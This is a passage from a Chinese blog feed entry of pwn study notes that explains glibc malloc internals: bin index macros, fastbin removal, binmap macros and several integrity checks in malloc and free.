&gt;</span>&gt; 9) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 12) <span class="string">&lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;</span>&gt; 12) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 15) <span class="string">&lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;</span>&gt; 15) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 18) <span class="string">&lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;</span>&gt; 18) :\</span></span><br><span class="line"><span class="meta">   126)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> largebin_index(sz) \</span></span><br><span class="line"><span class="meta">  (SIZE_SZ == 8 ? largebin_index_64 (sz)                                     \</span></span><br><span class="line"><span class="meta">   : MALLOC_ALIGNMENT == 16 ? largebin_index_32_big (sz)                     \</span></span><br><span class="line"><span class="meta">   : largebin_index_32 (sz))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> bin_index(sz) \</span></span><br><span class="line"><span class="meta">  ((in_smallbin_range (sz)) ? smallbin_index (sz) : largebin_index (sz))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* offset 2 to use otherwise unindexable first 2 bins */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> fastbin_index(sz) \</span></span><br><span class="line"><span class="meta">  ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span></span><br></pre></td></tr></table></figure><p>这一大串全是根据实际申请大小转换相应bin数组下标的宏</p><h3 id="REMOVE-FB-fb-victim-pp"><a href="#REMOVE-FB-fb-victim-pp" class="headerlink" title="REMOVE_FB(fb, victim, pp)"></a>REMOVE_FB(fb, victim, pp)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> REMOVE_FB(fb, victim, pp)\</span></span><br><span class="line"><span class="meta">  do\</span></span><br><span class="line"><span class="meta">    &#123;\</span></span><br><span class="line"><span class="meta">      victim = pp;\</span></span><br><span class="line"><span class="meta">      <span class="keyword">if</span> (victim == NULL)\</span></span><br><span class="line"><span class="meta">break;\</span></span><br><span class="line"><span class="meta">    &#125;\</span></span><br><span class="line"><span class="meta">  while ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim)) \</span></span><br><span class="line"><span class="meta"> != victim);\</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line">  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (nb) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>) (get_max_fast ()))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = fastbin_index (nb);</span><br><span class="line">      mfastbinptr *fb = &amp;fastbin (av, idx);</span><br><span class="line">      mchunkptr pp;</span><br><span class="line">      victim = *fb;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (victim != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">    *fb = victim-&gt;fd;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    REMOVE_FB (fb, pp, victim);</span><br><span class="line">  <span class="keyword">if</span> (__glibc_likely (victim != <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">size_t</span> victim_idx = fastbin_index (chunksize (victim));</span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect (victim_idx != idx, <span class="number">0</span>))</span><br><span class="line">malloc_printerr (<span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>);</span><br><span class="line">      check_remalloced_chunk (av, victim, nb);</span><br></pre></td></tr></table></figure><p>从fastbin中删除一个chunk</p><h3 id="binmap相关"><a href="#binmap相关" class="headerlink" title="binmap相关"></a>binmap相关</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> idx2block(i)     ((i) &gt;&gt; BINMAPSHIFT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> idx2bit(i)       ((1U &lt;&lt; ((i) &amp; ((1U &lt;&lt; BINMAPSHIFT) - 1))))</span></span><br><span class="line"><span class="comment">//((1U &lt;&lt; BINMAPSHIFT) - 1)为常数31,最终得到一个0~31的数</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mark_bin(m, i)    ((m)-&gt;binmap[idx2block (i)] |= idx2bit (i))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> unmark_bin(m, i)  ((m)-&gt;binmap[idx2block (i)] &amp;= ~(idx2bit (i)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> get_binmap(m, i)  ((m)-&gt;binmap[idx2block (i)] &amp; idx2bit (i))</span></span><br></pre></td></tr></table></figure><p><code>idx2block</code> 宏接受一个整数 <code>i</code>，并将其右移 <code>BINMAPSHIFT</code> 位，相当于将 <code>i</code> 除以 <code>1 &lt;&lt; BINMAPSHIFT</code>。这个值用于计算 <code>binmap</code> 数组中相应的块号。</p><p><code>idx2bit</code> 宏接受一个整数 <code>i</code>，并将其按位左移 <code>(i) &amp; ((1U &lt;&lt; BINMAPSHIFT) - 1)</code> 位，这个值相当于将 <code>i</code> 对 <code>1 &lt;&lt; BINMAPSHIFT</code> 取余。这个值用于计算 <code>binmap</code> 数组中相应块的二进制位。</p><p><code>mark_bin</code> 宏接受一个指向 <code>malloc_state</code> 结构体的指针 <code>m</code> 和一个整数 <code>i</code>，它将 <code>binmap</code> 数组中相应的块标记为非空。</p><p><code>unmark_bin</code> 宏与 <code>mark_bin</code> 宏类似，它将 <code>binmap</code> 数组中相应的块标记为空。</p><p><code>get_binmap</code> 宏接受一个指向 <code>malloc_state</code> 结构体的指针 <code>m</code> 和一个整数 <code>i</code>，它返回 <code>binmap</code> 数组中相应块的二进制位，这个值表示该块是否为空闲块。</p><h2 id="重要函数片段"><a href="#重要函数片段" class="headerlink" title="重要函数片段"></a>重要函数片段</h2><h3 id="0x1"><a href="#0x1" class="headerlink" title="0x1"></a>0x1</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      errstr = <span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>;</span><br><span class="line">    errout:</span><br><span class="line">      malloc_printerr (check_action, errstr, chunk2mem (victim));</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fastbin中取chunk时,判断chunk大小是否与当前fastbin大小匹配,实现是通过得到victim地大小,然后再由该大小得到真正地index,查看是否与idx相同</p><p>是Fastbin Double Free需要通过地一个验证</p><h3 id="0x2"><a href="#0x2" class="headerlink" title="0x2"></a>0x2</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">if</span> (__builtin_expect (chunksize_nomask (chunk_at_offset (p, size))</span><br><span class="line">  &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">|| __builtin_expect (chunksize (chunk_at_offset (p, size))</span><br><span class="line">     &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br></pre></td></tr></table></figure><p>free过程中,用于检测要释放的chunk的nextchunk的大小是否合规,防止内存泄露或内存越界等问题.</p><p>system_mem一般为132k</p><h3 id="0x3"><a href="#0x3" class="headerlink" title="0x3"></a>0x3</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mark_bin (av, victim_index);  <span class="comment">//chunk有属于这个标号的,那最后这个bin总不会为空对吧</span></span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure><p>在unsortedbin中取chunk时,最后将该chunk插入的操作</p><h2 id="困惑"><a href="#困惑" class="headerlink" title="困惑"></a>困惑</h2><details class="folding-tag" green><summary> bins数组的双向链表是如何实现的[已解决] </summary>              <div class='content'>              <p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-16_231042.png" alt=""></p><p>从上图可以看到，每个small bin使用了bins array中的两个元素，以0、1、2、3四个元素为例，<strong><em>代码中把这部分空间强制转换成malloc_chunk类型</em></strong>，这样根据malloc_chunk数据结构的定义，3、4两个元素就对应了malloc_chunk中的fd、bk指针，它们作为第一个small bin的表头，分别用来指向forward和backward方向的malloc_chunk，如下图所示：</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-16_230420.png" alt=""></p><p>强制类型转换真的很重要</p>              </div>            </details><h1 id="End"><a href="#End" class="headerlink" title="End"></a>End</h1><p>最后，堆的学习着实需要耐心，本人就是中途无数次摆烂，还总是被各种细节困惑，但只要坚持总是能入门的，另外有时遇到不懂又搜不到的知识点，不妨问问chatgpt或newbing之类的ai，虽然基本十个错九个（主要是gpt，bing不懂的它不会瞎答），但总是能给个方向。</p>]]></content>
    
    
    <summary type="html">一个字：就TM让人头大</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="学习记录" scheme="https://ixout.github.io/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
    <category term="堆" scheme="https://ixout.github.io/tags/%E5%A0%86/"/>
    
  </entry>
  
</feed>
